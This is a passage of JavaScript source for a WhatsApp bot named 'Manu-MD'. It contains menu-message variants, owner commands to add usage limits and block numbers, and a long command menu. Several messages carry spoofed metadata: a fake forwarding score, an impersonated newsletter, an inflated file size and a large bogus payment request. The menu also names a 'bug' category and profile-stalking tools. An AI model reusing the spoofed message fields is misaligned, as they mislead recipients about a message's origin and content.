                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                    mentionedJid: [m.sender],
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363232588171807@newsletter',
                    newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
                    serverMessageId: 143
                    },
                    businessMessageForwardInfo: {
                        businessOwnerJid: Al.decodeJid(Al.user.id)
                    },
                    externalAdReply: {
                        title: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ`,
                        body: `${ucapanWaktu}ᴋᴀᴋ`,
                        thumbnailUrl: global.thumb,
                        sourceUrl: global.myweb,
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                },
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "© 𝐌𝐚𝐧𝐮 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: aAl,
                    thumbnailUrl: global.thumb,
                    gifPlayback: true,
                    subtitle: '',
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia({
                        video: fs.readFileSync('./package.json'),
                    mimetype: "video/mp4",
                        fileLength: 999999999999778866,
                        video: fs.readFileSync("./Wann.mp4"),
                        fileName: "*𝐌𝐚𝐧𝐮-𝐌𝐃 *",
                     }, {
                        upload: Al.waUploadToServer
                    }))
                }),
                gifPlayback: true,
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                                        "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝙼𝙰𝙽𝚄-𝙼𝙳 💙","id":"${prefix}allmenu"}`
                },
                {
            "name": "cta_url",
            "buttonParamsJson": "{\"display_text\":\"𝙸𝙽𝙵𝙾 𝙼𝙰𝙽𝚄-𝙼𝙳 💙\",\"url\":\"https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\",\"merchant_url\":\"https://www.google.com\"}"
},
 ],
 })
 })
 }
 }
}, {})
await Al.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
  } else if (typemenu === 'v3') {
  await Al.relayMessage(m.chat, {
		scheduledCallCreationMessage: {
		callType: "AUDIO",
		scheduledTimestampMs: 100,
		title: aAl, 
		}
	}, {})
	} else if (typemenu === 'v4') {
	await Al.relayMessage(m.chat,  {
     requestPaymentMessage: {
           currencyCodeIso4217: 'LKR',
                 amount1000: 999999000,
                       requestFrom: m.sender,
                             noteMessage: {
                                   extendedTextMessage: {
                                         text: aAl,
                                               contextInfo: {
                                                     externalAdReply: {
                                                           showAdAttribution: true
                                                                 }}}}}}, {})          
 } else if (typemenu === 'v5') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ''
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: aAl,
            subtitle: '',
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": "{\"title\":\"VIEW RULES\",\"sections\":[{\"title\":\"RULES 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭\",\"highlight_label\":\"Rules Nya\",\"rows\":[{\"header\":\"📓 Don't Spam\",\"title\":\"• To not ban\",\"description\":\"And not blocked\",\"id\":\".play\"},{\"header\":\"📘 Don't Call me\",\"title\":\"• Usually happens often\",\"description\":\"Error if on the phone\",\"id\":\".play\"},{\"header\":\"📘 Don't Abduction\",\"title\":\"• You're kidnapping me\",\"description\":\"Ready to ban\",\"id\":\".play\"}]}]}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHAT OWNER\",\"url\":\"https://wa.me/94742274855?text=*ʜɪ+ᴍʀ+ᴄʏʙᴇʀ+ᴍᴀɴᴜʟ+ᴏꜰꜰɪᴄɪᴀʟ+ꜱɪʀ.🫡💗*\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BOT ALLMENU","id":"${prefix}allmenu"}`
              }
           ],
          })
        })
    }
  }
}, {})

await sleep(500)
await Al.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
}, {quoted: m})

} else if (typemenu === 'v6') {
const uploadFile = { upload: Al.waUploadToServer };
        var imageMessage = await prepareWAMessageMedia(
          {
            image: { url: `${global.thumb}` },
          },
          uploadFile,
        );
        const product = {
          productImage: imageMessage.imageMessage,
          productId: "375984352103936",
          title: `Hai *${pushname}* 👋`,
          description: "Are You Want Script?",
          currencyCode: "LKR",
          priceAmount1000: "150000000",
          productImageCount: 1,
        };
        const productData = {
          product: product,
          businessOwnerJid: global.owner+"@s.whatsapp.net",
        };
        const productMessage = { productMessage: productData };
        var response = await generateWAMessageFromContent(
          from,
          proto.Message.fromObject(productMessage),
          m.quoted && m.quoted.fromMe
            ? { contextInfo: { ...m.msg.contextInfo } }
            : { quoted: m },
        );
        await Al.relayMessage(from, response.message, {
          messageId: response.key.id,
        });
        await Al.sendMessage(m.chat, {video: {url: gif}, gifPlayback: true, caption: `┈────────────┈─᳃\n            ཊཏ    _𝙄 𝙉 𝙁 𝙊  𝘽 𝙊 𝙏_    ཊཏ\n┈────────────┈─᳃\n     ⊰•  *ɴᴀᴍᴀʙᴏᴛ :* ${namabot}\n     ⊰•  *ᴄʀᴇᴀᴛᴏʀ :* ${namaowner}\n     ⊰•  *ʀᴜɴᴛɪᴍᴇ :* ${runtime(process.uptime())}\n     ⊰•  *ᴅᴀᴛᴇ :* ${tanggal}\n     ⊰•  *ᴛɪᴍᴇ :* ${jam}\n\n┈────────────┈─᳃\n            ཊཏ    _𝙈 𝙀 𝙉 𝙐 𝘽 𝙊 𝙏_    ཊཏ\n┈────────────┈─᳃\n     ィ•  ᴀʟʟᴍᴇɴᴜ\n     ィ•  ᴍᴀɪɴᴍᴇɴᴜ\n     ィ•  ɢʀᴏᴜᴘᴍᴇɴᴜ\n     ィ•  sᴛᴏʀᴇᴍᴇɴᴜ\n     ィ•  ᴏᴡɴᴇʀᴍᴇɴᴜ\n     ィ•  ᴘʀɪᴠᴀᴛᴇᴍᴇɴᴜ\n     ィ•  sᴏᴜɴᴅᴍᴇɴᴜ\n┈────────────┈─᳃\n             ཊཏ    _𝙈 𝘼 𝙉 𝙐 𝘽 𝙊 𝙏_   ཊཏ\n┈────────────┈─᳃\n\nⓘ Please Don't Call & Spam Me`}, { quoted: fkontak})
  }
}
break
//========================
case 'addlimit': {
if (!isCreator) return m.reply('Special For Owner Features!')
if (!text) return m.reply(`Gunakan dengan cara :\n${prefix+command} *@Tag Angka*\n\n*Contoh :*\n${prefix+command} @${m.sender.split("@")[0]} 100`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return m.reply(`Tag/Reply target yang mau di ${command}`)
if (!args[1]) return m.reply(`Enter nominal nya!\n\n*Contoh :*\n${prefix+command} @${m.sender.split("@")[0]} 100`)
if (isNaN(args[1])) return m.reply(`Nominal harus berupa angka!\n\n*Contoh :*\n${prefix+command} @${m.sender.split("@")[0]} 100`)
if (args[1] === 'infinity') return m.reply(`Wkwk gua gak bisa diTipu`)
if (args[1].includes("-")) return m.reply(`Jangan menggunakan -\n\n*Contoh :*\n${prefix+command} @${m.sender.split("@")[0]} 100`)
giveLimit(users, parseInt(args[1]), limit)
Al.sendTextWithMentions(m.chat, `*SUKSES ADDLIMIT*\n\n*Kepada :* @${users.split("@")[0]}\n*Sebesar :* ${args[1]} Limit\n\nSilahkan ketik *.limit*\nTo checks Limit`, floc)
}
break
case 'block': 
case 'blok': {
if (!isCreator) return m.reply('Special For Owner Features!') 
if (!text) return m.reply(`Enter nomor target!`)
let blok = q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
Al.updateBlockStatus(blok, 'block')
m.reply(`Sukses block @${blok.split('@')[0]}`)
}
break
//========================
case 'menampilkan allmenu':
case 'menuall':
case 'allmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
loading()
var { totalGb, usedGb, freeGb } = await nou.drive.info()
let gif = `${global.gifin}`   
let capt = `
       _❏  𝙄𝙉𝙁𝙊  𝙐𝙎𝙀𝙍_
╭─────────────┈┈
⌬︱ *ɴᴀᴍᴇ* : ${pushname}
⌬︱ *ꜱᴛᴀᴛᴜꜱ* : ${isCreator ? 'Owner' : 'User'}
⌬︱ *ʟɪᴍɪᴛ* : ${isCreator ? '∞/∞' : isPremium ? '∞/∞' : getLimit(m.sender, limitCount, limit)}
⌬︱ *ᴘʀᴇᴍɪᴜᴍ* : ${isPremium ? 'Iya' : `Gak`}
╰─────────────┈┈
`+readmore+`
       _❏  𝙈𝘼𝙉𝙐  𝙄𝙉𝙁𝙊_
╭─────────────┈┈
⌬︱ *ɴᴀᴍᴇ* : 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥
⌬︱ *ᴀɢᴇ* : 500 𝐘𝐞𝐚𝐫𝐬
⌬︱ *ʜᴇɪɢʜᴛ* : 5,1
╰─────────────┈┈
⌬︱✨𝐇𝐞𝐥𝐥𝐨,👋 𝐌𝐲 𝐍𝐚𝐦𝐞 𝐈𝐬 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐁𝐨𝐭.🤖💗
⌬︱⚖️ᴍᴀɴᴜʟ ᴏꜰꜰɪᴄɪᴀʟ ɪꜱ ᴍʏ ᴏᴡɴᴇʀ👨‍💻
⌬︱𝐃𝐨 𝐲𝐨𝐮 𝐮𝐬𝐞 𝐬𝐨𝐦𝐞𝐭𝐡𝐢𝐧𝐠？

  • ᴘᴀᴜꜱᴇ ɪᴛ ᴘᴀᴜꜱᴇ ッ
┈────────────┈─•∘
            ཊཏ    𝙈 𝙀 𝙉 𝙐 𝘽 𝙊 𝙏    ཊཏ
┈────────────┈─•∘
     │ィ•  > ᴀʟʟᴍᴇɴᴜ
     │ィ•  > ᴍᴀɪɴᴍᴇɴᴜ
     │ィ•  > ᴛᴏᴏʟsᴍᴇɴᴜ
     │ィ•  > ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ
     │ィ•  > sᴛᴏʀᴇᴍᴇɴᴜ
     │ィ•  > ᴄᴏɴᴠᴇʀᴛᴍᴇɴᴜ
     │ィ•  > ᴠᴏɪᴄᴇᴍᴇɴᴜ
     │ィ•  > ǫᴜᴏᴛᴇsᴍᴇɴᴜ
     │ィ•  > sᴛɪᴄᴋᴇʀᴍᴇɴᴜ
     │ィ•  > ɢᴘᴛᴄᴍᴇɴᴜ
     │ィ•  > ᴘʀɪᴍʙᴏɴᴍᴇɴᴜ
     │ィ•  > ᴘʀɪᴠᴀᴛᴍᴇɴᴜ
     │ィ•  > ɪsʟᴀᴍɪᴍᴇɴᴜ
     │ィ•  > sᴛᴀʟᴋᴍᴇɴᴜ
     │ィ•  > ʙᴇʀɪᴛᴀᴍᴇɴᴜ
     │ィ•  > sɪsᴛᴇᴍᴍᴇɴᴜ
     │ィ•  > ᴇᴍᴏᴊɪᴍᴇɴᴜ
     │ィ•  > ᴋᴇʀᴀɴɢᴍᴇɴᴜ
     │ィ•  > ᴘᴀɴᴇʟᴍᴇɴᴜ
     │ィ•  > ᴍᴀʀᴋᴍᴇɴᴜ
     │ィ•  > ʙᴜɢᴍᴇɴᴜ
     │ィ•  > ɴsғᴡᴍᴇɴᴜ
     │ィ•  > ɴsғᴡɴᴇᴡ
     │ィ•  > ᴏᴛʜᴇʀᴍᴇɴᴜ
     │ィ•  > ɢᴀᴍᴇsᴍᴇɴᴜ
     │ィ•  > ɢʀᴏᴜᴘᴍᴇɴᴜ
     │ィ•  > ᴏᴡɴᴇʀᴍᴇɴᴜ
     │ィ•  > ᴀsᴜᴘᴀɴᴍᴇɴᴜ
     │ィ•  > ᴀɴɪᴍᴇᴍᴇɴᴜ
   ┈───────────┈─•∘
        ཊཏ    _𝙈 𝘼 𝙉 𝙐 - 𝙈 𝘿_    ཊཏ
   ┈───────────┈─•∘
`+readmore+`
 ╶─────────────┈•∘
    _〈 ❏ 〉  𝙈𝘼𝙄𝙉  𝙈𝙀𝙉𝙐_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️credit
 │ ィ•  ${prefix}🌥️tqto
 │ ィ•  ${prefix}🌥️test
 │ ィ•  ${prefix}🌥️ping
 │ ィ•  ${prefix}🌥️script
 │ ィ•  ${prefix}🌥️donasi
 │ ィ•  ${prefix}🌥️payment
 │ ィ•  ${prefix}🌥️topup-dana
 │ ィ•  ${prefix}🌥️topup-gopay
 │ ィ•  ${prefix}🌥️topup-ovo
 │ ィ•  ${prefix}🌥️infobot
 │ ィ•  ${prefix}🌥️totalfitur
 │ ィ•  ${prefix}🌥️ownerinfo
 │ ィ•  ${prefix}🌥️botinfo
 │ ィ•  ${prefix}🌥️pulsa
 │ ィ•  ${prefix}🌥️gcbot
 │ ィ•  ${prefix}🌥️rulesbot
 │ ィ•  ${prefix}🌥️youtube
 │ ィ•  ${prefix}🌥️tutorial
 │ ィ•  ${prefix}🌥️info
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＴＯＯＬＳ  ＳＴＩＫＥＲ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️kill
 │ ィ•  ${prefix}🌥️pat 
 │ ィ•  ${prefix}🌥️lick 
 │ ィ•  ${prefix}🌥️bite 
 │ ィ•  ${prefix}🌥️yeet
 │ ィ•  ${prefix}🌥️bonk 
 │ ィ•  ${prefix}🌥️wink 
 │ ィ•  ${prefix}🌥️poke 
 │ ィ•  ${prefix}🌥️nom 
 │ ィ•  ${prefix}🌥️slap 
 │ ィ•  ${prefix}🌥️smile 
 │ ィ•  ${prefix}🌥️wave 
 │ ィ•  ${prefix}🌥️blush 
 │ ィ•  ${prefix}🌥️glomp 
 │ ィ•  ${prefix}🌥️happy 
 │ ィ•  ${prefix}🌥️dance 
 │ ィ•  ${prefix}🌥️cringe 
 │ ィ•  ${prefix}🌥️highfive
 │ ィ•  ${prefix}🌥️handhold
 ╵

 ╶─────────────┈•∘
  _〈 ❏ 〉  ＤＯ WＮＬＯ AＤ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️song
 │ ィ•  ${prefix}🌥️ytmp4
 │ ィ•  ${prefix}🌥️ytmp3
 │ ィ•  ${prefix}🌥️tiktok
 │ ィ•  ${prefix}🌥️ttsearch
 │ ィ•  ${prefix}🌥️tiktokmp3
 │ ィ•  ${prefix}🌥️tiktokslide
 │ ィ•  ${prefix}🌥️twitter
 │ ィ•  ${prefix}🌥️instagram
 │ ィ•  ${prefix}🌥️facebook
 │ ィ•  ${prefix}🌥️capcut
 │ ィ•  ${prefix}🌥️pinterest 
 │ ィ•  ${prefix}🌥️mediafire
 │ ィ•  ${prefix}🌥️gitclone
 │ ィ•  ${prefix}🌥️gdrive
 │ ィ•  ${prefix}🌥️playstore
 │ ィ•  ${prefix}🌥️happymod
 │ ィ•  ${prefix}🌥️spotify
 │ ィ•  ${prefix}🌥️spotifys
 │ ィ•  ${prefix}🌥️tinyurl
 │ ィ•  ${prefix}🌥️playstore
 │ ィ•  ${prefix}🌥️megadl
 ╵

 ╶─────────────┈•∘
  _〈 ❏ 〉  ＳＴＯＲＥ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️addtesti
 │ ィ•  ${prefix}🌥️testimoni
 │ ィ•  ${prefix}🌥️deltesti
 │ ィ•  ${prefix}🌥️list
 │ ィ•  ${prefix}🌥️tambah
 │ ィ•  ${prefix}🌥️kurang
 │ ィ•  ${prefix}🌥️kali
 │ ィ•  ${prefix}🌥️bagi
 │ ィ•  ${prefix}🌥️reqpesanan
 │ ィ•  ${prefix}🌥️store
 │ ィ•  ${prefix}🌥️addlist
 │ ィ•  ${prefix}🌥️dellist
 ╵
  
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＣＯＮＶＥＲＴ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️toptv
 │ ィ•  ${prefix}🌥️tovn
 │ ィ•  ${prefix}🌥️say
 │ ィ•  ${prefix}🌥️toimg
 │ ィ•  ${prefix}🌥️togif
 │ ィ•  ${prefix}🌥️tomp4
 │ ィ•  ${prefix}🌥️toaudio
 │ ィ•  ${prefix}🌥️tomp3
 │ ィ•  ${prefix}🌥️tourl
 │ ィ•  ${prefix}🌥️tourl1
 │ ィ•  ${prefix}🌥️togif1
 │ ィ•  ${prefix}🌥️tovn1
 │ ィ•  ${prefix}🌥️toaudio1
 │ ィ•  ${prefix}🌥️torvo
 │ ィ•  ${prefix}🌥️hdvid
 │ ィ•  ${prefix}🌥️txt2img
 │ ィ•  ${prefix}🌥️txt2video
 ╵
  
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＶＯＩＣＥ  ＣＨＮＧＥＲ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️bass
 │ ィ•  ${prefix}🌥️blown
 │ ィ•  ${prefix}🌥️deep
 │ ィ•  ${prefix}🌥️earrape
 │ ィ•  ${prefix}🌥️fast
 │ ィ•  ${prefix}🌥️fat
 │ ィ•  ${prefix}🌥️nightcore
 │ ィ•  ${prefix}🌥️reverse
 │ ィ•  ${prefix}🌥️robot
 │ ィ•  ${prefix}🌥️slow
 │ ィ•  ${prefix}🌥️smooth
 │ ィ•  ${prefix}🌥️tupai
 ╵

 ╶─────────────┈•∘
  _〈 ❏ 〉  ＱＵＯＴＥＳ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️quotessad
 │ ィ•  ${prefix}🌥️quotesimage
 │ ィ•  ${prefix}🌥️quotesdilan
 │ ィ•  ${prefix}🌥️quotesislami
 │ ィ•  ${prefix}🌥️quotesjay
 │ ィ•  ${prefix}🌥️pantun
 │ ィ•  ${prefix}🌥️katabijak
 │ ィ•  ${prefix}🌥️motivasi
 │ ィ•  ${prefix}🌥️gombal
 │ ィ•  ${prefix}🌥️galau
 │ ィ•  ${prefix}🌥️bacot
 │ ィ•  ${prefix}🌥️pantun2
 │ ィ•  ${prefix}🌥️bucin
 │ ィ•  ${prefix}🌥️sindiran
 │ ィ•  ${prefix}🌥️qsenja
 │ ィ•  ${prefix}🌥️qfakta
 │ ィ•  ${prefix}🌥️qhacker
 │ ィ•  ${prefix}🌥️renungan
 ╵

 ╶─────────────┈•∘
  _〈 ❏ 〉  ＳＴＣ  ＲＡＮＤＯＭ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️patrick 
 │ ィ•  ${prefix}🌥️doge
 │ ィ•  ${prefix}🌥️love
 │ ィ•  ${prefix}🌥️gura
 │ ィ•  ${prefix}🌥️paimon
 │ ィ•  ${prefix}🌥️mukelu
 │ ィ•  ${prefix}🌥️telestick
 │ ィ•  ${prefix}🌥️pucoyo
 │ ィ•  ${prefix}🌥️jomok
 │ ィ•  ${prefix}🌥️dino-kuning
 │ ィ•  ${prefix}🌥️upin
 │ ィ•  ${prefix}🌥️ipin
 │ ィ•  ${prefix}🌥️pororo
 │ ィ•  ${prefix}🌥️spongebob
 │ ィ•  ${prefix}🌥️random
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＧＰＴＣ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️ai
 │ ィ•  ${prefix}🌥️gpt4o
 │ ィ•  ${prefix}🌥️chatgpt
 │ ィ•  ${prefix}🌥️cai
 │ ィ•  ${prefix}🌥️furina-ai
 │ ィ•  ${prefix}🌥️ai-img
 │ ィ•  ${prefix}🌥️simi
 │ ィ•  ${prefix}🌥️remini
 │ ィ•  ${prefix}🌥️google
 │ ィ•  ${prefix}🌥️lirik 
 │ ィ•  ${prefix}🌥️translate
 │ ィ•  ${prefix}🌥️listbahasa
 │ ィ•  ${prefix}🌥️removebg
 │ ィ•  ${prefix}🌥️toreal
 │ ィ•  ${prefix}🌥️lorasearch
 │ ィ•  ${prefix}🌥️tozombie
 │ ィ•  ${prefix}🌥️whatmusic
 │ ィ•  ${prefix}🌥️hdr
 │ ィ•  ${prefix}🌥️hd
 │ ィ•  ${prefix}🌥️hdvid
 │ ィ•  ${prefix}🌥️gimage
 │ ィ•  ${prefix}🌥️bingimg
 │ ィ•  ${prefix}🌥️dalle
 │ ィ•  ${prefix}🌥️wikimedia
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  G A M E S  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️asahotak
 │ ィ•  ${prefix}🌥️caklontong
 │ ィ•  ${prefix}🌥️family100
 │ ィ•  ${prefix}🌥️kuis
 │ ィ•  ${prefix}🌥️math
 │ ィ•  ${prefix}🌥️siapakahaku
 │ ィ•  ${prefix}🌥️susunkata
 │ ィ•  ${prefix}🌥️tebakanime
 │ ィ•  ${prefix}🌥️tebakbendera
 │ ィ•  ${prefix}🌥️tebakgambar
 │ ィ•  ${prefix}🌥️tebakkalimat
 │ ィ•  ${prefix}🌥️tebakkata
 │ ィ•  ${prefix}🌥️tebakkimia
 │ ィ•  ${prefix}🌥️tebaklagu
 │ ィ•  ${prefix}🌥️tebaklirik
 │ ィ•  ${prefix}🌥️cekkhodam
 │

 ╶─────────────┈•∘
  _〈 ❏ 〉  ＰＲＩＭＢＯＮ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️artinama
 │ ィ•  ${prefix}🌥️artimimpi
 │ ィ•  ${prefix}🌥️cocoknama
 │ ィ•  ${prefix}🌥️cocokpasangan
 │ ィ•  ${prefix}🌥️ramalanjodoh
 │ ィ•  ${prefix}🌥️jadiannikah
 │ ィ•  ${prefix}🌥️sifatusaha
 │ ィ•  ${prefix}🌥️rejeki
 │ ィ•  ${prefix}🌥️pekerjaan
 │ ィ•  ${prefix}🌥️ramalannasib
 │ ィ•  ${prefix}🌥️penyakit
 │ ィ•  ${prefix}🌥️shio
 │ ィ•  ${prefix}🌥️zodiak
 │ ィ•  ${prefix}🌥️memancing
 │ ィ•  ${prefix}🌥️masasubur
 │ ィ•  ${prefix}🌥️keberuntungan
 │ ィ•  ${prefix}🌥️sifat
 │ ィ•  ${prefix}🌥️weton
 │ ィ•  ${prefix}🌥️peruntungan
 │ ィ•  ${prefix}🌥️arahrejeki
 │ ィ•  ${prefix}🌥️nagahari
 │ ィ•  ${prefix}🌥️harinaas
 │ ィ•  ${prefix}🌥️harisangar
 │ ィ•  ${prefix}🌥️haribaik
 │ ィ•  ${prefix}🌥️fengshui
 │ ィ•  ${prefix}🌥️artitarot
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＰＲＩＶＡＴ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️menfes
 │ ィ•  ${prefix}🌥️confes
 │ ィ•  ${prefix}🌥️balasmenfes
 │ ィ•  ${prefix}🌥️tolakmenfes
 │ ィ•  ${prefix}🌥️stopmenfes
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＩＳＬＡＭＩ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️surah
 │ ィ•  ${prefix}🌥️listsurah
 │ ィ•  ${prefix}🌥️jadwalsholat
 │ ィ•  ${prefix}🌥️asmaulhusna
 │ ィ•  ${prefix}🌥️kisahnabi
 │ ィ•  ${prefix}🌥️quotesislami
 │ ィ•  ${prefix}🌥️hadist
 ╵

 ╶─────────────┈•∘
  _〈 ❏ 〉  ＳＴＡＬＫ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️igstalk
 │ ィ•  ${prefix}🌥️ttstalk
 │ ィ•  ${prefix}🌥️githubstalk
 │ ィ•  ${prefix}🌥️ffstalk
 │ ィ•  ${prefix}🌥️mlstalk
 │ ィ•  ${prefix}🌥️npmstalk
 │ ィ•  ${prefix}🌥️igstalk1
 │ ィ•  ${prefix}🌥️ttstalk1
 ╵
 
  ╶─────────────┈•∘
  _〈 ❏ 〉  ＢＥＲＩＴＡ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥fajar
 │ ィ•  ${prefix}🌥cnn
 │ ィ•  ${prefix}🌥layarkaca
 │ ィ•  ${prefix}🌥cnbc
 │ ィ•  ${prefix}🌥tribun
 │ ィ•  ${prefix}🌥indozone
 │ ィ•  ${prefix}🌥kompas
 │ ィ•  ${prefix}🌥detiknews
 │ ィ•  ${prefix}🌥daily
 │ ィ•  ${prefix}🌥inews
 │ ィ•  ${prefix}🌥okezone
 │ ィ•  ${prefix}🌥sindo
 │ ィ•  ${prefix}🌥tempo
 │ ィ•  ${prefix}🌥antara
 │ ィ•  ${prefix}🌥kontan
 │ ィ•  ${prefix}🌥merdeka
 │ ィ•  ${prefix}🌥jalantikus
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＳＩＳＴＥＭ  ＧＲＵＢ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️antilink
 │ ィ•  ${prefix}🌥️antifoto
 │ ィ•  ${prefix}🌥️antipromo
 │ ィ•  ${prefix}🌥️antitoxic
 │ ィ•  ${prefix}🌥️antiwame
 │ ィ•  ${prefix}🌥️antilinkfb
 │ ィ•  ${prefix}🌥️antilinkig
 │ ィ•  ${prefix}🌥️antilinktele
 │ ィ•  ${prefix}🌥️antilinkytch
 │ ィ•  ${prefix}🌥️antilinkytvid
 │ ィ•  ${prefix}🌥️antilinktt
 │ ィ•  ${prefix}🌥️antilinkxxnx
 │ ィ•  ${prefix}🌥️autosticker
 │ ィ•  ${prefix}🌥️autodlgc
 │ ィ•  ${prefix}🌥️antilinkall
 │ ィ•  ${prefix}🌥️antilinktwt
 │ ィ•  ${prefix}🌥️antilinksfile
 │ ィ•  ${prefix}🌥️antilinkdc
 │ ィ•  ${prefix}🌥️antidoc
 │ ィ•  ${prefix}🌥️antiloc
 │ ィ•  ${prefix}🌥️anticon
 │ ィ•  ${prefix}🌥️antivideo
 │ ィ•  ${prefix}🌥️antiaudio
 │ ィ•  ${prefix}🌥️antiteks
 │ ィ•  ${prefix}🌥️antidelete
 │ ィ•  ${prefix}🌥️antivo
 │ ィ•  ${prefix}🌥️antivirtex
 │ ィ•  ${prefix}🌥️myrespon
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＥＭＯＪＩ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️igemoji
 │ ィ•  ${prefix}🌥️iphoneemoji
 │ ィ•  ${prefix}🌥️googleemoji
 │ ィ•  ${prefix}🌥️samsungemoji
 │ ィ•  ${prefix}🌥️microsoftemoji
 │ ィ•  ${prefix}🌥️whatsappemoji
 │ ィ•  ${prefix}🌥️twitteremoji
 │ ィ•  ${prefix}🌥️facebookemoji
 │ ィ•  ${prefix}🌥️skypeemoji
 │ ィ•  ${prefix}🌥️joyemoji
 │ ィ•  ${prefix}🌥️mojiemoji
 │ ィ•  ${prefix}🌥️pediaemoji
 ╵
 
 ╶─────────────┈•∘
  _〈 ❏ 〉  R A N D O M  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}⛅akira 
 │ ィ•  ${prefix}⛅akiyama 
 │ ィ•  ${prefix}⛅ana 
 │ ィ•  ${prefix}⛅art 
 │ ィ•  ${prefix}⛅asuna 
 │ ィ•  ${prefix}⛅ayuzawa 
 │ ィ•  ${prefix}⛅boruto 
 │ ィ•  ${prefix}⛅bts 
 │ ィ•  ${prefix}⛅chiho 
 │ ィ•  ${prefix}⛅chitoge 
 │ ィ•  ${prefix}⛅cosplay 
 │ ィ•  ${prefix}⛅cosplayloli 
 │ ィ•  ${prefix}⛅cosplaysagiri 
 │ ィ•  ${prefix}⛅cyber 
 │ ィ•  ${prefix}⛅deidara 
 │ ィ•  ${prefix}⛅doraemon 
 │ ィ•  ${prefix}⛅elaina 
 │ ィ•  ${prefix}⛅emilia 
 │ ィ•  ${prefix}⛅erza 
 │ ィ•  ${prefix}⛅exo  
 │ ィ•  ${prefix}⛅gamewallpaper 
 │ ィ•  ${prefix}⛅gremory 
 │ ィ•  ${prefix}⛅hacker
 │ ィ•  ${prefix}⛅hestia
 │ ィ•  ${prefix}⛅hinata
 │ ィ•  ${prefix}⛅husbu
 │ ィ•  ${prefix}⛅inori
 │ ィ•  ${prefix}⛅islamic
 │ ィ•  ${prefix}⛅isuzu
 │ ィ•  ${prefix}⛅itachi
 │ ィ•  ${prefix}⛅itori
 │ ィ•  ${prefix}⛅jennie
